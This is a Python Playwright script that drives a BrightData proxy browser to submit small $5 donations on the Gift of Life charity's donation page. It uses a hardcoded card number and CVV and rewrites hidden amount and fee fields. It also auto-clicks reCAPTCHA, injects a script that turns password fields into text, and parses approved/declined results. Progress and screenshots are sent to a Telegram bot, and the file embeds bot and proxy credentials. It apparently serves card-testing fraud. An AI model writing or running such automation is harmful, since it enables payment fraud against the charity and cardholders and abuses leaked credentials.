#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Gift of Life Donation v16 — init script forces type=text at page load
"""

import os
import time
import json
import requests
import traceback

try:
    from playwright.sync_api import sync_playwright
except ImportError:
    os.system("pip install playwright")
    os.system("playwright install chromium")
    from playwright.sync_api import sync_playwright

BOT_TOKEN = "8647240736:AAEGXuwmtZkUvAfbURX2BcyyuoWD-TekP_0"
CHAT_ID = 6843321125

BD_HOST = "brd.superproxy.io"
BD_PORT = "9222"
BD_USER = "brd-customer-hl_24c8058e-zone-scraping_browser1"
BD_PASS = "eyr0v46j28pi"

TARGET_URL = "https://gift-of-life.org/make-a-donation/"

FIRST_NAME = "Wafa"
LAST_NAME = "Bro"
EMAIL = "wafabro980@gmail.com"
PHONE = "2019679866"
ADDRESS_1 = "W356"
ADDRESS_2 = "Apt 12"
CITY = "Carifnia"
STATE_VALUE = "1305"
ZIP = "90011"

CARD_NUMBER = "5178057879094972"
CARD_NAME = "Wafa Bro"
CARD_MONTH = "08"
CARD_YEAR = "2030"
CARD_CVV = "123"
CARD_TYPE = "MasterCard"

DONATION_AMOUNT = "5"

P = "_ArrevaOnlineDonationsPortlet_WAR_ArrevaOnlineDonationsPortlet_:form1:"

# ═══════════════════════════════════════════════════
# INIT SCRIPT — يجبر type=password يبقى text
# ═══════════════════════════════════════════════════
INIT_SCRIPT = """
(function() {
    // 1. Override setAttribute
    const origSetAttribute = Element.prototype.setAttribute;
    Element.prototype.setAttribute = function(name, value) {
        if (name === 'type' && value && value.toLowerCase() === 'password') {
            value = 'text';
        }
        return origSetAttribute.call(this, name, value);
    };
    
    // 2. Override type property
    const origDescriptor = Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, 'type');
    if (origDescriptor) {
        Object.defineProperty(HTMLInputElement.prototype, 'type', {
            get: function() {
                return origDescriptor.get.call(this);
            },
            set: function(v) {
                if (v && v.toLowerCase() === 'password') {
                    v = 'text';
                }
                return origDescriptor.set.call(this, v);
            },
            configurable: true
        });
    }
    
    // 3. Override HTMLInputElement prototype
    const origInput = HTMLInputElement.prototype;
    const origPasswordDesc = Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, 'type');
    
    console.log('[INIT] Password typing bypass installed');
})();
"""

def sid(name): return f'[id="{P}{name}"]'

def tg_msg(text):
    try:
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                      data={"chat_id": CHAT_ID, "text": text[:4000], "parse_mode": "HTML"}, timeout=15)
    except Exception as e: print(f"TG msg error: {e}", flush=True)

def tg_photo(path, caption=""):
    try:
        with open(path, "rb") as f:
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
                          data={"chat_id": CHAT_ID, "caption": caption[:1000]},
                          files={"photo": f}, timeout=30)
    except Exception as e: print(f"TG photo error: {e}", flush=True)

def find_donation_frame(page, total_seconds=120):
    start = time.time(); attempt = 0
    while time.time() - start < total_seconds:
        attempt += 1
        for f in page.frames:
            try:
                if f.locator('[id*="datafirst"]').first.count() > 0:
                    tg_msg(f"✅ Found form in frame name='{f.name}'")
                    return f, attempt
            except Exception: pass
        time.sleep(2)
    return None, attempt

def fill_text_field(frame, field_suffix, value, label=""):
    try:
        el = frame.locator(sid(field_suffix)).first
        el.wait_for(state="visible", timeout=10000)
        el.fill(str(value), timeout=5000)
        el.evaluate("el => el.dispatchEvent(new Event('input',{bubbles:true}))")
        actual = frame.evaluate("(id) => { const el = document.getElementById(id); return el ? el.value : null; }", f"{P}{field_suffix}")
        tg_msg(f"{'✅' if actual == str(value) else '⚠️'} {label or field_suffix}: '{actual}'")
        return actual == str(value)
    except Exception as e:
        tg_msg(f"❌ {label or field_suffix}: {str(e)[:150]}")
        return False

def fill_card_safely(frame, field_suffix, value, label=""):
    """محاولة متعددة: fill عادي، لو فشل keyboard، لو فشل JS"""
    tg_msg(f"🔄 Filling {label or field_suffix}...")
    
    # 1. جرّب fill عادي
    try:
        el = frame.locator(sid(field_suffix)).first
        el.wait_for(state="visible", timeout=10000)
        el.fill(str(value), timeout=5000)
        el.evaluate("el => el.dispatchEvent(new Event('input',{bubbles:true}))")
        actual = frame.evaluate("(id) => { const el = document.getElementById(id); return el ? el.value : null; }", f"{P}{field_suffix}")
        if actual == str(value):
            tg_msg(f"✅ {label} (fill): '{actual}'")
            return True
        else:
            tg_msg(f"⚠️ {label} (fill): value lost")
    except Exception as e:
        tg_msg(f"⚠️ {label} (fill): {str(e)[:100]}")
    
    # 2. keyboard.type
    try:
        el = frame.locator(sid(field_suffix)).first
        el.click(timeout=3000)
        page = frame.page
        page.keyboard.press("Control+A")
        page.keyboard.press("Delete")
        page.keyboard.type(str(value), delay=40)
        time.sleep(0.5)
        actual = frame.evaluate("(id) => { const el = document.getElementById(id); return el ? el.value : null; }", f"{P}{field_suffix}")
        if actual == str(value):
            tg_msg(f"✅ {label} (keyboard): '{actual}'")
            return True
        else:
            tg_msg(f"⚠️ {label} (keyboard): value lost")
    except Exception as e:
        tg_msg(f"⚠️ {label} (keyboard): {str(e)[:100]}")
    
    # 3. JS
    try:
        frame.evaluate("""([id, val]) => {
            const el = document.getElementById(id);
            if (!el) return false;
            el.value = val;
            el.dispatchEvent(new Event('input', {bubbles: true}));
            el.dispatchEvent(new Event('change', {bubbles: true}));
            return true;
        }""", [f"{P}{field_suffix}", str(value)])
        actual = frame.evaluate("(id) => { const el = document.getElementById(id); return el ? el.value : null; }", f"{P}{field_suffix}")
        if actual == str(value):
            tg_msg(f"✅ {label} (JS): '{actual}'")
            return True
        else:
            tg_msg(f"⚠️ {label} (JS): value lost")
    except Exception as e:
        tg_msg(f"⚠️ {label} (JS): {str(e)[:100]}")
    
    tg_msg(f"❌ {label}: all methods failed")
    return False

def select_option_safe(frame, field_suffix, value, label=""):
    try:
        ok = frame.evaluate("""([id, val]) => {
            const el = document.getElementById(id);
            if (!el) return false;
            el.value = val;
            el.dispatchEvent(new Event('change', { bubbles: true }));
            return true;
        }""", [f"{P}{field_suffix}", value])
        tg_msg(f"{'✅' if ok else '❌'} {label or field_suffix}: '{value}'")
        return ok
    except Exception as e:
        tg_msg(f"❌ {label or field_suffix}: {str(e)[:150]}")
        return False

def remove_processing_fee(frame):
    try:
        result = frame.evaluate(f"""() => {{
            const P = '{P}';
            const cb = document.getElementById(P + 'includeFee_input');
            if (!cb) return {{found: false}};
            if (cb.checked) cb.click();
            if (cb.checked) {{ cb.checked = false; cb.dispatchEvent(new Event('change', {{bubbles: true}})); }}
            return {{found: true, checked: cb.checked}};
        }}""")
        tg_msg(f"✅ includeFee: {json.dumps(result, ensure_ascii=False)}")
        return result.get("checked") == False
    except Exception as e:
        tg_msg(f"❌ remove fee: {str(e)[:150]}")
        return False

def set_amount_exact(frame, amount):
    tg_msg(f"🔄 Setting exact amount = ${amount}")
    try:
        frame.evaluate(f"""() => {{
            const rb = document.getElementById('{P}rb_amount:4');
            if (rb) {{ rb.checked = true; rb.dispatchEvent(new Event('change', {{bubbles: true}})); }}
        }}""")
        tg_msg("✅ Other radio checked")
    except Exception as e: tg_msg(f"⚠️ Other: {str(e)[:120]}")
    time.sleep(3)
    try:
        frame.evaluate("""(amt) => {
            const el = document.querySelector('input[id*="other_amount"]');
            if (!el) return false;
            el.value = amt;
            el.dispatchEvent(new Event('input', { bubbles: true }));
            el.dispatchEvent(new Event('change', { bubbles: true }));
            return true;
        }""", str(amount))
        tg_msg(f"✅ other_amount = {amount}")
    except Exception as e: tg_msg(f"❌ other_amount: {str(e)[:120]}")
    time.sleep(3)
    remove_processing_fee(frame)
    time.sleep(2)
    total = float(amount)
    try:
        frame.evaluate(f"""(total) => {{
            const P = '{P}';
            const atp = document.getElementById(P + 'amount_to_pay');
            if (atp) atp.value = total.toFixed(2);
            const lt = document.getElementById('label_total_amount');
            if (lt) lt.value = '$ ' + total.toFixed(2);
            const lth = document.getElementById(P + 'label_total_hidden_amount');
            if (lth) lth.value = '$ ' + total.toFixed(2);
            const lp = document.getElementById(P + 'label_payment_amount');
            if (lp) lp.value = '$ ' + total.toFixed(2);
            const oao = document.getElementById(P + 'other_amount_on');
            if (oao) oao.value = 'true';
            const fa = document.getElementById(P + 'fee_amount');
            if (fa) fa.value = '0.00';
        }}""", total)
        tg_msg(f"✅ hidden fields updated: ${total:.2f}")
    except Exception as e: tg_msg(f"❌ hidden: {str(e)[:150]}")
    time.sleep(2)
    try:
        check = frame.evaluate(f"""() => {{
            const P = '{P}';
            return {{
                other: document.querySelector('input[id*="other_amount"]')?.value,
                total_label: document.getElementById('label_total_amount')?.value,
                amount_to_pay: document.getElementById(P + 'amount_to_pay')?.value,
                includeFee: document.getElementById(P + 'includeFee_input')?.checked,
            }};
        }}""")
        tg_msg(f"📋 Amount state: {json.dumps(check, ensure_ascii=False)}")
    except Exception: pass

def solve_captcha(frame, page):
    tg_msg("🔄 reCAPTCHA")
    try:
        token = frame.evaluate("""() => {
            const ta = document.querySelector('textarea[name="g-recaptcha-response"]');
            return ta ? ta.value : '';
        }""")
        tg_msg(f"📌 Token len = {len(token) if token else 0}")
        if token and len(token) > 20: return True
    except Exception: pass
    try:
        for f in page.frames:
            try:
                if "recaptcha/api2/anchor" in (f.url or ""):
                    cb = f.locator("#recaptcha-anchor").first
                    cb.wait_for(state="attached", timeout=8000)
                    cb.click(force=True, timeout=5000)
                    tg_msg("✅ Clicked reCAPTCHA")
                    break
            except Exception: continue
        for i in range(25):
            try:
                token = frame.evaluate("""() => {
                    const ta = document.querySelector('textarea[name="g-recaptcha-response"]');
                    return ta ? ta.value : '';
                }""")
                if token and len(token) > 20:
                    tg_msg(f"✅ reCAPTCHA solved! len={len(token)}")
                    return True
            except Exception: pass
            time.sleep(1)
        tg_msg("⚠️ reCAPTCHA still empty")
        return False
    except Exception as e:
        tg_msg(f"⚠️ reCAPTCHA: {str(e)[:150]}")
        return False

def handle_acceptance(page):
    tg_msg("🔄 Checking Acceptance popup...")
    for i in range(30):
        try:
            yes_btn = page.locator(".ui-confirmdialog-yes").first
            if yes_btn.count() > 0 and yes_btn.is_visible():
                tg_msg("✅ Clicking Yes (Continue)")
                yes_btn.click(timeout=5000)
                return True
        except Exception: pass
        try:
            cont = page.locator("button:has-text('Continue')").first
            if cont.count() > 0 and cont.is_visible():
                tg_msg("✅ Clicking Continue")
                cont.click(timeout=5000)
                return True
        except Exception: pass
        time.sleep(1)
    tg_msg("⚠️ No acceptance popup")
    return False

def run():
    tg_msg("🚀 Gift of Life Donation v16 — init script + multi-fill")

    cdp_url = f"wss://{BD_USER}:{BD_PASS}@{BD_HOST}:{BD_PORT}"

    try:
        pw = sync_playwright().start()
        browser = pw.chromium.connect_over_cdp(cdp_url, timeout=120000)
        tg_msg("✅ Connected to BrightData")
    except Exception as e:
        tg_msg(f"❌ Connect: {str(e)[:200]}")
        return

    context = browser.new_context(
        viewport={"width": 1366, "height": 900},
        user_agent=("Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
                    "(KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36"),
        locale="en-US",
    )
    
    # ═══ Init script قبل أي page ═══
    context.add_init_script(INIT_SCRIPT)
    tg_msg("✅ Init script added")
    
    page = context.new_page()
    page.set_default_timeout(60000)

    tg_msg("🔄 [1] Opening...")
    try:
        page.goto(TARGET_URL, wait_until="domcontentloaded", timeout=60000)
        time.sleep(10)
    except Exception as e:
        tg_msg(f"❌ Load: {str(e)[:200]}")
        return
    tg_msg("✅ Page loaded")

    tg_msg("🔄 [2] Finding form...")
    frame, attempts = find_donation_frame(page, 120)
    if not frame:
        try:
            page.reload(wait_until="domcontentloaded", timeout=60000)
            time.sleep(15)
        except Exception: pass
        frame, attempts = find_donation_frame(page, 90)
    if not frame:
        tg_msg("❌ not found")
        return
    tg_msg(f"✅ frame='{frame.name}'")
    time.sleep(5)

    # 3. اطبع type الحقول قبل أي حاجة
    try:
        types = frame.evaluate(f"""() => {{
            const P = '{P}';
            const cn = document.getElementById(P + 'cardNumber');
            const cv = document.getElementById(P + 'cardCSV');
            return {{
                cardNumber_type: cn ? cn.type : 'not_found',
                cardCSV_type: cv ? cv.type : 'not_found',
            }};
        }}""")
        tg_msg(f"📋 Field types BEFORE: {json.dumps(types, ensure_ascii=False)}")
    except Exception: pass

    # 4. المبلغ
    set_amount_exact(frame, DONATION_AMOUNT)

    # 5. بيانات المتبرع
    tg_msg("🔄 [5] Donor info...")
    fill_text_field(frame, "datafirst", FIRST_NAME, "First name")
    fill_text_field(frame, "datalast", LAST_NAME, "Last name")
    fill_text_field(frame, "email", EMAIL, "Email")
    fill_text_field(frame, "data_phone", PHONE, "Phone")
    fill_text_field(frame, "data_address_one", ADDRESS_1, "Address")
    fill_text_field(frame, "data_address_two", ADDRESS_2, "Apt/Suite")
    fill_text_field(frame, "data_address_city", CITY, "City")
    fill_text_field(frame, "data_address_zip", ZIP, "Zip")

    try:
        us_value = frame.evaluate(f"""() => {{
            const sel = document.querySelector('select[id="{P}data_Rcountry"]');
            if (!sel) return null;
            for (const o of sel.options) {{
                const t = o.text.trim().toLowerCase();
                if (t === 'united states' || t === 'usa' || t === 'us') return o.value;
            }}
            return null;
        }}""")
        if us_value:
            select_option_safe(frame, "data_Rcountry", us_value, f"Country (US={us_value})")
    except Exception as e: tg_msg(f"⚠️ Country: {str(e)[:150]}")

    select_option_safe(frame, "data_Rstate", STATE_VALUE, "State (CA)")

    # 6. اطبع type الحقول بعد الـ init script
    try:
        types2 = frame.evaluate(f"""() => {{
            const P = '{P}';
            const cn = document.getElementById(P + 'cardNumber');
            const cv = document.getElementById(P + 'cardCSV');
            return {{
                cardNumber_type: cn ? cn.type : 'not_found',
                cardCSV_type: cv ? cv.type : 'not_found',
            }};
        }}""")
        tg_msg(f"📋 Field types AFTER init: {json.dumps(types2, ensure_ascii=False)}")
    except Exception: pass

    # 7. البطاقة — multi-fill
    tg_msg("🔄 [7] Card info (MULTI-FILL)...")
    time.sleep(1)
    fill_text_field(frame, "nameOnCard", CARD_NAME, "Card name")
    fill_card_safely(frame, "cardNumber", CARD_NUMBER, "Card number")
    fill_card_safely(frame, "cardCSV", CARD_CVV, "CVV")
    select_option_safe(frame, "cardType", CARD_TYPE, "Card type")
    select_option_safe(frame, "expiration_date_month", CARD_MONTH, "Exp month")
    select_option_safe(frame, "expiration_date_year", CARD_YEAR, "Exp year")

    try:
        page.screenshot(path="/tmp/before_captcha.png", full_page=True)
        tg_photo("/tmp/before_captcha.png", "📸 Before captcha")
    except Exception: pass

    # 8. captcha
    captcha_ok = solve_captcha(frame, page)

    # 9. Pre-submit
    tg_msg("🔄 [9] Verifying...")
    try:
        vals = frame.evaluate(f"""() => {{
            const g = (n) => {{ const el = document.getElementById('{P}' + n); return el ? el.value : null; }};
            const cb = document.getElementById('{P}includeFee_input');
            return {{
                card_num_len: (g('cardNumber') || '').length,
                cvv_len: (g('cardCSV') || '').length,
                card_type: g('cardType'),
                amount_to_pay: g('amount_to_pay'),
                includeFee: cb ? cb.checked : null,
                recaptcha_len: (g('g-recaptcha-response') || '').length,
            }};
        }}""")
        tg_msg(f"📋 Pre-submit:\n<pre>{json.dumps(vals, indent=1, ensure_ascii=False)}</pre>")
    except Exception as e: tg_msg(f"⚠️ Verify: {str(e)[:150]}")

    # 10. Submit
    tg_msg("🔄 [10] Clicking Submit...")
    try:
        btn = frame.locator(sid("j_idt1913")).first
        btn.wait_for(state="visible", timeout=10000)
        btn.click(timeout=5000)
        tg_msg("✅ Submit clicked")
    except Exception as e: tg_msg(f"⚠️ Submit: {str(e)[:150]}")

    time.sleep(5)

    # 11. Acceptance
    tg_msg("🔄 [11] Handling Acceptance...")
    handle_acceptance(page)

    time.sleep(15)

    # 12. النتيجة
    tg_msg("🔄 [12] Reading result...")
    time.sleep(10)
    try:
        page.screenshot(path="/tmp/result.png", full_page=True)
        tg_photo("/tmp/result.png", "📸 Result")
    except Exception: pass

    try:
        iframe_text = frame.evaluate("() => document.body.innerText")
        lines = []
        for line in iframe_text.split("\n"):
            l = line.strip()
            if any(k in l.lower() for k in ["success","approved","declin","error","invalid",
                                             "thank","confirm","failed","reject","captcha",
                                             "verified","otp","verification","limit","enter"]):
                lines.append(l)
        if lines:
            tg_msg("📊 Result:\n" + "\n".join(lines[:30]))
        else:
            tg_msg("⚠️ no keywords. preview:\n<pre>" + iframe_text[:2000] + "</pre>")
    except Exception as e:
        tg_msg(f"⚠️ read: {str(e)[:150]}")

    tg_msg("✅ DONE")
    try: context.close()
    except: pass
    try: browser.close()
    except: pass
    try: pw.stop()
    except: pass

if __name__ == "__main__":
    try:
        run()
    except Exception as e:
        tg_msg(f"❌ FATAL:\n{traceback.format_exc()[:3500]}")
